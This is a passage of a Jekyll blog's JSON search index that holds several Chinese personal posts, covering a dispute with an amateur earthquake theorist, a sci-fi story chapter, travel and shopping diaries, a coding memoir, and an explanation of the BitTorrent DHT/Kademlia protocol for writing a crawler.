/>\n第一次，我采用的是镇海的例子，但是计算错误了。随后我又使用了四川，但是有一个细节没有考虑全。<br />\n这些都是我的失误，我也就没说什么。第三次，我采用日本作为例子，进行了三层校验，没有任何的计算失误。但是，这次却被意想不到的驳回——说我第一次的数据引用的不可考。我引用的是CIA世界概况。鉴于CIA是美国政府机构，数据不客观也在质疑的情理之中。所以我几经周折，使用了国际能源署（IEA）的权威数据。总想着这次是中立的权威数据，应该是无可置疑的。<br />\n后面他就说了一个让人愤怒而啼笑皆非的理由：『你的数据是统计数据，不是科学数据，不能用作科学计算』。后面还用了一堆粗俗的语言。很难想象一个老干部会有这般的胡闹。<br />\n我的数据是IEA取自METI（日本经济产业省）的，是METI测量的，与实验室实验测量的数据根本上是没有区别的。况且地理学测量很难像物理学一样精准，数据的有效数字和误差就是那个水平，是可以作为计算依据的。<br />\n为了让他彻底心服口服，我按照地震级数反推天然气数量，结果更是与他的理论相差甚远。<br />\n这是我的<a href=\"/jekyll/update/2017/08/10/关于-地震不是由爆炸引起的-证明.html\">证明</a>。<br />\n这下，他不再对计算置评，而转而抛出更为可笑的事：\n『他否定板块学说，引用的是“真理居士”的文章』且不说文章的可笑。既然你否认，那就得拿出新的可自洽，符合范式，能说明客观事实的理论来。后来的他连理论都没有，净贴那篇文章……』<br />\n最后虽是自己知道被反驳的完全无理，但还是有劲没劲地自我安慰。<br />\n再后来开始预测地震……\n<br /></p>\n<hr />\n\n<p><br />\n（三）总结<br />\n这次反驳民科的经历其实揭露了许多有趣而深刻的社会道理，其实也是反映出社会教育层面的一些问题。<br />\n首先，这让我意识到，民科并不是缺少专业知识，而是缺乏科学素养，这是十分可怕的。<br />\n科学素养是什么？说到底就是敢于质疑也敢于接受别人的见解。但是民科呢？根本不具有科学素养，闹出很多啼笑皆非的事情来：比如：『我的理论在你的实验里是错的，那一定是你的实验做错了，我的理论一定是对的；还有，我为什么要听你的，你的科学整个都是错误的，但是自己却又提不出个半点理论来，更不用说自洽了……』<br />\n如果一个民科有了科学素养，那他一定能够接受别人的见解，同时也敢于质疑。这样的人一定不会成为民科。<br />\n我一向不反对推翻，但是推翻之后你得提出，且得有依据的提出。很多时候，与民科之间的学术讨论往往会变成吵架的原因就是民科的蛮不讲理。<br />\n关于民科，就是这样，现在我们来说一下基础教育。<br />\n<br />\n我一直认为教育的中心思想应该培养的就是学生的思辨精神，能质疑也可接受。最佳的状态就是能在两者之间完美权衡，这样的学生无论在怎样的学习内容、环境面前都可以游刃有余。当然，事实上并不是这样的，偏向总是存在的。但是极端一定会导致严重的问题。举两个例子：<br />\n民科：严重偏向于质疑，还自认为是西式化的先进表现，虽然西方的教育一直强调质疑，但是并不意味着没有接受的过程，不接受又何谈质疑？<br />\n传统：严重偏向接受，尽管这样的学生或人已经很少了，但是严重偏向接受只会让人变成『会说话的电脑』。<br />\n这两个反面例子可以看出瘸腿的后果。<br />\n这就是我对基础教育的核心看法。<br />\n<br />\n最后再来说说老干部文化。可以说这是中国独有的文化，也是中国学术界中『污浊教授』老后的再升级。不过也无可厚非，只有那些目的不纯的学术研究者才会抛弃科学的大船转而利用各种逻辑谬论对大众洗脑，因为他们的眼中是永远的金钱与利益。学术界怎么样，中国怎么样，中国学术界怎么样他并不在乎，他只在乎能不能坐稳这个位，收稳这个钱。可能这也是中国学术界之前声誉不好的原因吧。<br />\n<br />\n就是这样，记住，社会中的人渣一定存在，只要自己follow the master就可以了，不用关系人渣的命运，你也不可能从人渣那里汲取什么。无论谁怎么说，地球，宇宙总会按照着原本的样子运转着。</p>\n"
    } ,
  
    {
      "title"    : "幕后 第四章",
      "category" : "",
      "tags"     : "幕后系列, 随笔",
      "url"      : "/jekyll/update/2017/08/06/%E5%B9%95%E5%90%8E-%E7%AC%AC%E5%9B%9B%E7%AB%A0.html",
      "date"     : "2017-08-06 11:05:00 +0800",
      "content"  : "<p>坐标：美国-华盛顿·哥伦比亚特区-五角大楼 地球纪元2033年冬<br />\n最终，汤姆·惠灵顿方面决定采用曲速引擎作为最终的解决方案。但是这也具有极大的风险，毕竟，曲速引擎的理论还为得到过完全验证，如果出点闪失，整个舰队都有可能回不来，当然地球也是，因为引擎方面全都是北约与泛亚太联盟在负责。<br />\n实际上，全人类只有一次机会，要是行动不完美，曲速引擎如此进行空间折叠一会被GN-z11文明发现，这个时候可能真的没有机会了。所以北约希望这一仗能够打得出其不意，也唯有如此。<br />\n<br /></p>\n<hr />\n\n<p><br />\n坐标：美国-俄亥俄州空军基地 地球纪元2033年冬</p>\n\n<p>今天，是曲速引擎进行总装和地面试验的日子。美军提前花费了1个月的时间用概率云把整个基地包裹得严严实实。同时在外大量驻军。曲速引擎实际上并不是一个单纯的推进器，它需要将空间进行折叠，这才是技术的关键。这次，马克·瑟里奇和汤姆他们专门设置了一堆装置来进行空间折叠。这些装置将被铺装在舰队的表面，就像20世纪末美军的隐形涂料一样，受舰船的控制，来对周围的时空进行扭曲、折叠。而最后的推进器只不过是普通的核聚变推进器而已。<br />\n冬日的俄亥俄，大雪纷飞，却终究抵不住寂寞。如今虽是大雪依旧，但是当年下雪时的欣喜已断然全无，当年下雪时的心情也回不来了。<br />\n亚瑟三人在冰天雪地里坐着，等待着工程师们的总装，也开始怀念现在的地球。终于，他们躺在雪地里，全身陷进松软的雪堆，对着灰蒙蒙的天空不住发呆，痴痴地望着，什么都不去想，三人都不愿相信这个世界是假的，至少这一刻，他们的心是真实的。未来要开启的征程，至少要让自己真实存在过。<br />\n<br /></p>\n<hr />\n\n<p><br />\n坐标：中国东北-黑龙江鸭绿江沿岸某村庄 地球纪元2033年冬<br />\n同样是大雪纷飞，这一年的冬天对于陆家来说没有什么不寻常的地方。但是或许陆家是唯一几家“坚守”在这个村庄。出于被迫的“坚守”。村里其余的人家大都搬去城里镇上住了。就算其他几家还在的，年轻人也都外出去打工了。<br />\n唯独陆家几个年轻人很不争气，个个都屯在家中，啥事情也不干。以前其他几家的老人和年轻人们总对他们议论纷纷，后来也就都习惯了。<br />\n这三个年轻人分别是：陆宇航，陆峰和陆昂。三个人整日要么是热在炕上玩手机，要么是有一阵没一阵的在鸭绿江冰面上闲晃，逛累的时候就喝小贩从老毛子那走私来的便宜烈酒。实际上是伏特加，但是质量极差，酒除了烈就没别的了，喝下去整个人简直就要烧起来。三个人喝酒喝混了，深一脚浅一脚地在雪地上走会家。整日悠闲是悠闲，日子却是过的天昏地暗，看见哥三个，脸上蒙着一层猪油似的困意。<br />\n陆宇航，当年高考落榜，回家，也不跟着父母务农狩猎，就颓废丧志。陆峰从小就好着狩猎，整天和傻狍子玩，脑袋里恐怕也就装着些许对付狍子的傻办法。不过，三个人因为有了个打猎好手，也就不愁吃肉问题。陆昂，曾经被家里抱有众望的一子，虽说高考是考上了，但是也是混得一个三本的垃圾大学，瞒着家里人三本也至少算是大学，总比老大落榜好，就交了学费。大学里也就学着富二代吃喝玩乐，四年下来，可谓是半点机灵都没学会。回了家可是连打狍子都不会了。<br />\n最可怕的是老大还天天做着发财的美梦，周围的人都嘲笑他说简直不可能，确实，按照老大现如今的自身水平和周围环境，还真是不可能。为了生计，每日，老大和老二都会去打狍子，留一只自己吃，其余的去卖了买酒喝。</p>\n\n<h2 id=\"未完待续\">未完待续</h2>\n"
    } ,
  
    {
      "title"    : "象印杭州",
      "category" : "",
      "tags"     : "随笔, 生活",
      "url"      : "/jekyll/update/2017/08/05/%E8%B1%A1%E5%8D%B0%E6%9D%AD%E5%B7%9E.html",
      "date"     : "2017-08-05 14:03:00 +0800",
      "content"  : "<p><img src=\"/image/杭州-鸟.jpg\" alt=\"\" /></p>\n<hr />\n\n<p><br /></p>\n<blockquote>\n  <p>杭州，一个静与动的完美结合；一段现代与古代的姻缘；一处自然与发展融洽相处的圣地。</p>\n</blockquote>\n\n<center>（一）浙江省博物馆</center>\n<p>浙江省博物馆与杭州其他许多的博物馆坐落在一个广场。我十分赞赏这种设计。博物馆，作为历史的诉说者，也作为城市的名片。从人类的出现到近代历史，浙江省博物馆很好地讲述着这一切，并且保有着十大镇馆之宝。用藏品和文字一步步揭开千年来的历史面纱，其中包括玉琮在内的珍品，都标志着人类文明的一次又一次的进步。从浙江作为全国文化的中心到浙江的衰落，再到兴起，无不向人类诉说着杭州的历史变迁、人文情怀。</p>\n<center>（二）灵隐古刹</center>\n<p>清泉潺潺，古树斜倚，一旁“飞来山上千寻塔”，一旁千年古刹禅意深。灵隐寺坐落在西湖的西北面，靠山面山，是江南禅宗“五山”之一。由西印度僧人慧理修建。曾经与灵隐寺一同诞生的有五座古刹，但是都不同程度的被破坏和捣毁。现如今只剩下灵隐寺这唯一的一座了。清乾隆帝曾亲笔赐名“云林禅寺”。现如今的灵隐寺有着络绎不绝的香客、游客，欣然接受着天底下善男信女的虔诚。灵隐寺这一座千年古刹经历了一代又一代的兴衰，曾经面临过寺毁僧散的厄运，也曾兴盛至极，成为乾隆下江南的必经之所。我学着当年乾隆在山顶古泉用泉水洗手，品龙井，再到灵隐寺静心参禅。品位茶与佛与禅三者和一的境界。</p>\n\n<center>(三)浙江大学</center>\n<p>浙大，是杭州也是浙江省内最好的大学之一。这次我造访的是浙江大学数个校区中历史最悠久的玉泉校区。玉泉校区很有百年老校的风貌。此时的浙大，正好处于120周年校庆之际。校区内的建筑都是红砖瓦修葺而成。采用三角形的尖顶。很有民国建筑风格。青色的爬山虎爬遍了整堵墙。满地长着绿色植物，高及脚踝。校园的路边都种着大树，似乎是白杨或是垂柳，遮着半边天。从校门口望去就可以看到毛泽东挥手的铜像。我来时，正好天空有几番下雨的意思。阴云密布，铜像在此之中，恰似一番拨云见日的意象，别有一番趣味与威严。<br />\n校区似乎修在斜坡之上。在学校中骑着自行车，可以看到许多名人募捐修建的建筑，如：邵逸夫体育馆。作为一座百年名校，浙大可能是我到过的最有学术气氛的大学。加之杭州深厚的文化底蕴，更是一所独一无二的大学。</p>\n<center>（四）西湖印象 </center>\n<p>来到杭州就不得不提及西湖。杭州之美，美离不开自然景致，却也少不了人文风韵。如果西湖失去文化色泽，那它的自然风光估摸着只能算得上是一公园罢。大不及太湖，深不及钱湖。但是白居易与苏轼相继来此做官为政，并为西湖的历史涂抹上浓重的一笔。以及历来文人骚客的诗词歌赋加之民间传说，使得西湖——虽不及太湖之大，却诗篇众多；虽不及钱湖之深，但白苏二人却对她一往情深。<br />\n苏堤，是苏轼在治理西湖时用湖泥堆积而成。留下“水光潋滟晴方好，山色空蒙雨亦奇”的完美比喻。白堤，为储蓄湖水灌溉农田而建，原名白沙堤，白居易曾作有“最爱湖东行不足，绿杨阴里白沙堤”抒发情怀。\n游船环湖一周,我拂着迎面吹来的风，看着三潭映月，苏堤白提，如今的游人如织，看着雷峰塔以及回荡在空中的传说，再看看西湖四周现代化的建筑。一种古今交织的错觉出现在我的脑海中，奇妙而美好，这就是杭州的感觉，杭州的印象。</p>\n"
    } ,
  
    {
      "title"    : "我的Coding之路",
      "category" : "",
      "tags"     : "随笔, 编程",
      "url"      : "/jekyll/update/2017/08/01/%E6%88%91%E7%9A%84Coding%E4%B9%8B%E8%B7%AF.html",
      "date"     : "2017-08-01 16:03:00 +0800",
      "content"  : "<p><img src=\"/image/programmer-min.jpg\" alt=\"\" /></p>\n<hr />\n\n<p><br />\n       从小，我就对人工的，机械的事物感兴趣。提起编程，就可以追溯到我与机器人的渊源。小时候，还是处于对看得见，摸得着的东西比较感兴趣。从搭积木开始一步步接触到可编程主机。为了操控主机就势必得对它进行编程。当然，是拖动模块的图形化编程。十分好理解，但是限制也非常多。此外，要是程序一大，逻辑一复杂，就会很难更改和调试。<br />\n       这个时候我已经是小学三年级。偶尔听闻到学校有编程社团，以为也和图形化编程一般，不以为然。到了小学四年级，抱着看一看的心态，我进入了编程社团。我的第一门编程语言是Pascal，使用的IDE是FPC，记得版本是2.0.4（当然不是当时的最新版本）。<br />\n       我学起来很快，但是学校每星期一节的社团实在是不能让我学到什么。教起来拖沓迭代。也是四年级的暑假，我参加了区里的编程集训，这个夏令营虽然在现在看来没有教会我太多，但是醍醐灌顶地帮助我打下了基础，是不可或缺的。我对编程本身是真的有兴趣的，而绝非是对游戏或者电脑，在此期间，我会用每天新教的知识一步步搭建出一个游戏。这个游戏应该是我的第一个真真意义上可以玩的游戏，名字叫《星舰城市》。游戏做得是十分粗糙，不能存档，互动方式为“一问一答”……可以说缺点无数。这个游戏的源代码和可执行文件也已经丢失，无处可觅。但是这个游戏确实对我有划时代意义，很遗憾没能留下，它可以相当一些大一新生的游戏编程水平。</p>\n\n<p>       随后，我又开发过一款游戏，名叫《二战风云》。想比起星舰城市，界面更为友好，采用了重新输出的方式来展现动画。虽说帧率低下，很晃眼睛，但是却也算是一个进步。这款游戏夭折，是我人生的第一场数据危机——当时，我又一个U盘，代码和可执行文件就只在U盘中有，到哪里就插上U盘开始编程，可谓十分方便。但是我对U盘的牢固性却疏忽了。一次，我的膝盖稍微一撇，把机箱上的U盘给撇断，我当时就傻了。整个人一怔，我的同班同学——当时帮我开发这个游戏的武器“数据库”，连忙帮我百度如何解决。可惜，因为物理损伤，已经没有任何挽回的余地了。大概出于对劳动付诸东流的悲痛，我的同学直呼我是骗子，而我也同样痛不欲生。<br />\n       此后是编程道路上略带黑暗色彩的时期。记得是某一年的五一节，我和我的同学被报上了一个编程培训班，老师据说是宁波市名师。事实上，第一节课开始，我对他的印象就不佳。<br />\n       当时在讲排序算法，在介绍选择排序的时候，老师直接打开画图，写上几个数字：“你们看，1小于3，所以把1放到这里。”讲了半天，我觉得只是人工执行一遍程序，也许是老师表达不出来。训练了半年，我的算法翻译（就是把步骤转化为代码）能力倒是得到了显著提升，这是在为未来成为码农做准备（苦笑）。当然，每一个接触编程的人最开始都会对枯燥的算法产生抵触情绪。而不幸的是，我恰恰是那种必须彻底理解才能牢记的人。这对我快速学习编程也是不利的。最让我发指的是，这里的人背离了我的原则，他们根本不热爱编程，也有着虚伪的人格，他们把编程当作升学的推进器，但是，这些人在升学之后又能学会什么？甚至有人问我：一年学编程能拿奖吗？我的答案是：不能也不要。我觉得，为了升学而学习自己不喜欢的东西还不如不学，这花费的时间和金钱比升学本身的价值更多。总之，我觉得这个培训班将近一年半的时间内，我学得并不舒服。<br />\n       在这一年半的时间里，我对外的探索也从未停止过。我学习了一门新语言——C，有了第一台自己的笔记本（虽然配置不佳）。我学习C的过程中，也受到过老师的批评，但是我并没有停止。如果我停下了，那今天我所有的项目都是不存在的。其中，有我至今还在支持的项目。比如GAMEOX和LEDIT。都是我在那时候开始写的。值得一提的是，我当时使用的是Turbo C作为IDE，而且还固执地认为Turbo C十分不错。的确，我在转到Linux之前都是那么认为的。这就牵扯到编程观念的变化，暂且不说。<br />\n       GAMEOX是同学之间流行的纸笔游戏的电子版本，当时功能十分简陋，不能判断胜负，只能算是一个电子棋盘。当时也只打算开发到这种程度。但是奈何有太多想法涌现，开始大规模的开发，开发总是一阵一阵的，而且出于强迫症，总会在一个功能没有BUG的情况下再开发下一个功能。所以我所有用C语言编写的项目都具有强劲的异常处理容错能力。不论用户输入什么，都不会轻易异常。（在此吐槽一下现在国内的软件、电器厂商，产品都是做到“能用”，随便乱按几下就会主板失效，做电子产品就是要皮实，不论是硬件还是软件）自己编写LEDIT时经常会出现莫名其妙的问题——比如光标乱跳，文字在上一行显示，光标却在下一行，方向键随便按一下就内存溢出。但是都被我一个个解决了，这个项目也代表着我当时的最高水平。<br />\n       时间很快来到了六年级的暑假。这是一个意义重大的时期，我来到了Linux平台。事实上，我对Linux系统很早就有耳闻。但是我却不敢去尝试，因为四五年级的时候我没有安装过操作系统，我也仅有这一台电脑，要是装坏了可真的神仙也无奈。\n但是，我终究是忍不住的。所以，我开始在虚拟机中尝试。很快，摸清楚套路后决定在真机上尝试。为了避免双系统的繁琐步骤（我在此之前安装过Ubuntu与Windows 10双系统），我一气之下把Windows给格式化了，从此我就再也没有回到过Windows。我的第一个Linux发行版是Fedora，的确，这是一个优秀个发行版。慢慢的，我更多的去使用shell而不是GUI，Linux带给我的感觉也非常棒。我将我的两个项目移植到了Linux上。这个时候，虽然我能模拟出Turbo C，但是我已经不再使用它了。我渐渐得更加喜欢gcc和gdb的组合。Linux带给我了开源和现代化的编程理念，是我编程道路上的重要拐点。<br />\n       Linux新手难免不会去尝试各种发行版本，用了Fedora三个月之后，我就准备跳槽了。Archlinux是我最喜欢的发行版，但是安装步骤完全命令行，对我很不友好。所以我决定使用Archlinux的亲戚发行版——Manjaro。它确实安装简单，但是却带有浓重的Ubuntu风味，我也不喜欢。遂我开始安装Redhat系的CentOS，但是CentOS的内核和驱动还是21世纪初的版本，无法完美驱动我的笔记本，所以，还没有到一个星期，我就又换到了Debian。Debian非常优秀，但Stable版本太陈旧，无法安装jekyll。于是我又回到了Fedora。但是，Archlinux的诱惑还是很大，我无法抵挡。终于在今年3月，我安装了。除了网络问题，还是非常顺利的，因为我已经使用了有半年的Linux了。至今，我还在使用Archlinux，这是我使用时间最长的发新版。<br />\n       我又对LEDIT进行大量重构，使它具有现代编辑器的使用习惯。对GAMEOX加入了AI和保存以及智能判断模块。暑假，我又使用Python开发了Telegram机器人、自动拆分词根脚本、DHT爬虫等现代化的程序。Python的确强大，但是，我还是喜欢C的简洁和深沉。<br />\n       伴随着项目的开发，我也渐渐意识到算法的重要性，而我自己探索出来的写法和理解模式，是终身不会忘记的。</p>\n\n<p>以上</p>\n"
    } ,
  
    {
      "title"    : "海淘初体验",
      "category" : "",
      "tags"     : "随笔, 生活",
      "url"      : "/jekyll/update/2017/07/23/%E6%B5%B7%E6%B7%98%E5%88%9D%E4%BD%93%E9%AA%8C.html",
      "date"     : "2017-07-23 20:31:00 +0800",
      "content"  : "<p><img src=\"/image/包裹.JPG\" alt=\"\" />\n<br /></p>\n<hr />\n\n<p><br /></p>\n<blockquote>\n  <p>这是我第一次在美国亚马逊购物，这是我第一次海淘和收到外国包裹的经历。谨以此篇记录。</p>\n</blockquote>\n\n<p>       我很早就听闻说国外的电商平台质量好，价格比国内便宜。而亚马逊作为国外最大的电商平台，更是早早在我心中埋下了“国外电商=亚马逊”的种子。<br />\n       但是对于清关、派送、支付等一系列麻烦的手续以及国际船运的慢速流程，我始终不敢下手，尽管我们已经有过许多国内的网购经历。最重要的是，每每想下单的时候，总是会在脑海中浮现出各种收不到，派送错误，扣款错误，对方未发货而联系不上的情景，宛如一盆冷水浇在我头上。<br />\n       不过，亚马逊的低价实在是太诱人了，特别是对于国内的一些高附加值产品，不知道是利润翻了多少倍！这一次，我看中的是ALMY Alstar的一支限量色钢笔。在实体店的价格要580RMB，但是在美国亚马逊上只要$32.06，也就是说只要220.89RMB，这意味着可以便宜一半还要多140元！要知道，220元可是连LAMY Safari也买不起的。虽说比淘宝贵20元，但是可以绝对保证是正品。所以，我决定要买这支笔。<br />\n       终于，我在价格和品质上说服了妈妈。但是，我也是第一次购买，心里很是没底。在填写收货地址的时候我就遇到了大麻烦，由于美国是有州以及明确的邮编(ZIP CODE)的，而且他们大多数不是住在小区中，都有自己的别墅。所以，在这么短的地址栏中如何用拼音填写详细地址，我又犯了难。最终，我决定填写为妈妈单位的地址。后面的过程很顺利，绑定了信用卡，完成了付款。</p>\n\n<p>       但是，我很不适应的是，我付款之后，银行并没有给我发来扣款信息，以至于我都无法确认我是否购买了。带着这种疑惑与焦虑，我匆匆度过了这一天。我忐忑地等待着扣款信息。<br />\n       这一天晚上，我自作聪明地想——最近英国脱欧，欧洲与英国的经济都是持续低迷，能不能借着汇率省下一笔呢？我浏览了德国亚马逊的同款产品，的确便宜，只要170RMB左右。于是我偷着乐地取消了Preparing for package的订单。但是很快，我就发现，德国亚马逊并不支持International Shipment(国际直邮)，也就意味着需要转运公司。但是转运一来速度慢，不稳定，而来按重量计价，贵。真是沮丧，所以，我还是选择买个安心，又重新提交了订单。正是这一错误的抉择让我多等了好几天。<br />\n       第二次的订单提交后，我又在交易记录上发现了问题——多扣了一美元？这是为什么？为什么我要凭白无故地多支付一美元？第二天，我对亚马逊的客服发了一封邮件，详细询问了情况。原来，这一美元是用来检测银行卡是否丢失以及卡内的余额，很快就会退还。<br />\n       接下来就是漫长的等待。这次的国际直邮耗费了将近1个月的时间。我从开始每天焦急地查看到后来渐渐淡忘了这件事。突然有一天，通关网发来了一条信息，要求我进行报关信息地填写，我实在按捺不住自己的兴奋，在核对订单进行了填写。又过了许久，包裹终于到达中国了！最后的几天USPS很快就派送到了。<br />\n       由于过了好些日子，收到包裹时没有那么兴奋了。但是真正看到笔时还是真心喜欢。说明，这次的选择是正确的。\n<br />\n<img src=\"/image/LAMY/LAMY-2.JPG\" alt=\"\" />\n<img src=\"/image/LAMY/LAMY-1.JPG\" alt=\"\" />\n<img src=\"/image/LAMY/LAMY-4.JPG\" alt=\"\" />\n<img src=\"/image/LAMY/LAMY-3.JPG\" alt=\"\" />\n       每每想到这是大洋彼岸的快递，我总会感叹互联网的神奇，至今，我还是有点不可思议。但是亚马逊真的做到了，除了中国市场才进入1～2年，亚马逊在其他国家已经经营了15～20年之久了。而23年前，亚马逊诞生之时，阿里巴巴和京东根本就不存在。而亚马逊也以服务质量著称，客服有着十足的权力，而售后服务却是中国电商一直很头痛的问题，也是用户的痛点。只要亚马逊在中国能继续保持质优价低服务好的特点，再配备中国发达的快递业务，基本可以碾压淘宝和京东。<br />\n       我一直认为只有国外好的产品不断给国内产业加压，才能刺激中国公司的不断成长。举一个反面例子：百度。自从2010年Google离开中国之后，近年来不知道横向发展成什么样子。一家没有样子的科技公司，竞价排名浪费我们时间也就算了，还闹出人民，除了整合本地化外也就真的没有优点了。再比如，腾讯。自己的QQ没有聊天软件的样子，除了用户基数，哪一个能有Messager或Telegram做得好？也是时候引进一下外资企业，让用户得到更优质的服务，让企业好好纵向发展一下了！</p>\n"
    } ,
  
    {
      "title"    : "DHT网络详解与DHT爬虫编写指南",
      "category" : "",
      "tags"     : "网络, 编程, Python",
      "url"      : "/jekyll/update/2017/07/22/DHT%E7%BD%91%E7%BB%9C%E8%AF%A6%E8%A7%A3%E4%B8%8EDHT%E7%88%AC%E8%99%AB%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97.html",
      "date"     : "2017-07-22 14:52:00 +0800",
      "content"  : "<p><img src=\"/image/DHT-Spider.png\" alt=\"\" /></p>\n<hr />\n\n<p><br />\n<a href=\"https://github.com/LEXUGE/DHT-Spider\">DHT-Spider项目主页</a><br />\n<br /></p>\n<ol>\n  <li>\n    <p>前言与背景：<br />\n随着网络的不断发展，我们中的大多数应该都下载过东西。如果你是一位电影爱好者或开源软件爱好者。那你一定使用过P2P下载。其中，主流的就是BT下载。<br />\n虽然，BT是P2P下载，但实际上，他并不是完全P2P的。它需要Tracker来通告节点，进行信息交换。所以，近年来的版权保护者与政府部门一直在封禁和打击Tracker。比较近的例子就是BT Sync的Tracker被封禁，导致0节点的惨剧。<br />\n那能否做到真正的P2P呢？当然可以，这需要的是DHT(Distributed Hash Table 分布式哈系表)来进行传输，这就是一种去中心化网络。每个加入这个网络的节点都要负责维护一张表格用来存储网络中其他人和资源的信息。任何一个节点的损坏都不足以对整个网络造成致命影响。<br />\n但是就是因为这种隐秘性的特点，资源也是不为人知。尽管目前有许多的BT分享网站(比如：海盗湾),但是他们的中心化意味着他们有随时被关停的可能。所以，拥有一个自己的DHT爬虫来进行资源嗅探是很重要的。\n<br /></p>\n  </li>\n  <li>Kademlia网络：\n    <ul>\n      <li>Kademlia一个分散式杂凑表实现的协议，专门为P2P计算机网络设计。<br />\n该网络规定了网络的结构与节点信息查询方式，节点与结点之间使用UDP进行通讯。每个结点都有一个唯一的身份标识(节点ID)，所有的节点都维护着一张覆盖网。网络上的文件散列与节点ID直接对应，表示着哪个节点存储着的文件和相关信息。</li>\n      <li>Kademlia是用XOR进行节点距离的计算的。这样可以快速得到与目标节点(target)最近的节点(也有可能就是target),XOR的算法是bit位如果相等就记作0，否则为1，这意味着:\n        <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>1.当两个节点高位数值越为相同，XOR的结果也就越小，距离也就越小(这点上，无论是数学还是实际都是如此)。  \n2.具有反向对称性(A XOR B与B XOR A是相等的)\n3.XOR符合三角形的性质(即：a+b&gt;c),这点对于路由表的寻路起着巨大作用\n</code></pre>\n        </div>\n        <p>所以，XOR是作为距离计算的最佳算法。此外，XOR还能大幅增加寻路速度：可以保证每次与目标节点(target)靠近1 bit，这意味着：对于一个n位的节点ID，我们只需要至多log2(N)就可以找到目标节点。</p>\n      </li>\n      <li>Kademlia的路由表采用的是列表-条目的方式。每个条目由节点ID对应其的IP:port或资源等。对于一个N位的节点ID，它会拥有N个K桶(也就是说每个桶只能有K个节点)。其中，第1个桶距离节点最远(也就是最高位与节点ID的最高位取反)，第二个就是第二位，以此类推。注意，这里的K不一定能存储下所有的节点(也就是说不是完全的)。这样的存储方式有别于二叉树，进行了很好的分类，这可以让FIND_NODE操作返回更为精确和快速：当无法找到一模一样节点ID时，直接返回可能节点(表中与目标ID最近的节点)所在K桶中的K个元素即可(因为K桶内的元素与可能节点最近，最有可能和可能节点一起存储有目标ID)。</li>\n      <li>Kademlia的节点查询(FIND_NODE)：\n        <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>1.发起者在自己路由表中寻找与目标ID最近的K个节点发起FIND_NODE请求。\n2.接受者在接到以后，如果在自己的路由表中找到了目标节点，则返回该条目，否则返回可能节点所在K桶的K个节点条目\n3.发起者在自己发起请求的目标所在的K桶中更新返回结果，使K桶始终保持最优状态。\n4.发起者递归发起，直到找到目标节点。(如果没有发现节点更为接近的情况，那么就终止查询)  \n</code></pre>\n        </div>\n      </li>\n      <li>Kademlia加入网络：<br />\nKademlia网络中的新节点加入需要一个引导节点作为介绍人。也就是说你必须先知道引导节点的IP:port。当你连接上引导节点时，新节点会用FIND_NODE自己的方式来使引导节点去询问自己的邻居节点。之后，邻居节点继续询问邻居节点，直到引导节点找到新节点。这一操作会一路对邻居的K桶进行刷新。</li>\n    </ul>\n  </li>\n  <li>KPPC协议：<br />\n这是一种基于Kademlia的改进协议，支持四种消息格式：\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>1.ping 检测节点是否可连接\n2.find_node 得到给定节点ID的对应信息(IP:port)\n3.get_peers 根据infohash提供对应信息(IP:port)\n4.announce_peer 宣布自己正在下载torrent文件\n</code></pre>\n    </div>\n    <p>还需要注意，这里的消息包传送用的是bencode加密后的结果，关于bencode的加密方式：</p>\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>1.string: 字符是以这种方式编码的: &lt;字符串长度&gt;:&lt;字符串&gt;\n如 hell: 4:hell\n2.integer: 整数是一这种方式编码的: i&lt;整数&gt;e\n如 1999: i1999e\n3.list: 列表是一这种方式编码的: l[数据1][数据2][数据3][…]e\n如列表 [hello, world, 101]：l5:hello5:worldi101ee\n4.dictionary: 字典是一这种方式编码的: d[key1][value1][key2][value2][…]e，其中 key 必须是 string 而且按照字母顺序排序\n如字典 {aa:100, bb:bb, cc:200}： d2:aai100e2:bb2:bb2:cci200ee\n</code></pre>\n    </div>\n    <ul>\n      <li>KPPC消息包的基本元素：\n        <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>1.t关键字: 每条消息都包含 t 关键字，它是一个代表了 transaction ID 的字符串。transaction ID 由请求节点产生，并且回复中要包含回显该字段(挑战-响应模型)，所以回复可能对应一个节点的多个请求。transaction ID 应当被编码为一个短的二进制字符串，比如 2 个字节，这样就可以对应 2^16 个请求\n2.y关键字: 它由一个字节组成，表明这个消息的类型。y 对应的值有三种情况\n 1) q 表示请求(请求Queries): q类型的消息它包含 2 个附加的关键字 q 和 a\n   1.1) 关键字 q: 是字符串类型，包含了请求的方法名字(get_peers/announce_peer/ping/find_node)\n   1.2) 关键字 a: 一个字典类型包含了请求所附加的参数(info_hash/id..)\n 2) r 表示回复(回复 Responses): 包含了返回的值。发送回复消息是在正确解析了请求消息的基础上完成的，包含了一个附加的关键字 r。关键字 r 是字典类型\n   2.1) id: peer节点id号或者下一跳DHT节点\n           2.2) nodes\": \"\"\n           2.3) token: token\n 3) e 表示错误(错误 Errors): 包含一个附加的关键字 e，关键字 e 是列表类型\n   3.1) 第一个元素是数字类型，表明了错误码，当一个请求不能解析或出错时，错误包将被发送。下表描述了可能出现的错误码\n   201: 一般错误\n   202: 服务错误\n   203: 协议错误，比如不规范的包，无效的参数，或者错误的 toke\n   204: 未知方法\n   3.2) 第二个元素是字符串类型，表明了错误信息\n</code></pre>\n        </div>\n      </li>\n      <li>ping请求：<br />\nping用于检测节点是否可连接，包含一个节点ID，回复也包含回复者的节点ID。</li>\n      <li>find_node请求：<br />\n给定请求节点(被find_node的节点)的ID和目标ID,回复目标ID的info或者是可能节0点所在K桶的K个节点。</li>\n      <li>get_peers请求：\n包含请求节点的ID和infohash,给出目标ID的info</li>\n      <li>announce_peer请求：\n包含4个参数：\n        <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>1.id:包含请求节点的ID\n2.info_hash:包含torrent文件的info_hash\n3.port:表示peer正在下载的端口\n4.token:这里的token要与get_peers中得到的token相同才可以证明该announce_peer不是伪造的\n</code></pre>\n        </div>\n        <p>相关链接:<br />\n<a href=\"http://www.bittorrent.org/beps/bep_0005.html\">BEP_0005</a></p>\n      </li>\n    </ul>\n  </li>\n  <li>DHT-Spider实现：<br />\nDHT这种P2P网络在对抗攻击与封锁的同时也有如下的缺点：\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>1.伪造攻击: 有些不听话的用户可能会在DHT网络里捣乱，譬如说撒谎，明明自己不是奥巴马，却偏说自己是奥巴马，这样会误导其他人无法正常获取想要的资源\n2.嗅探攻击: 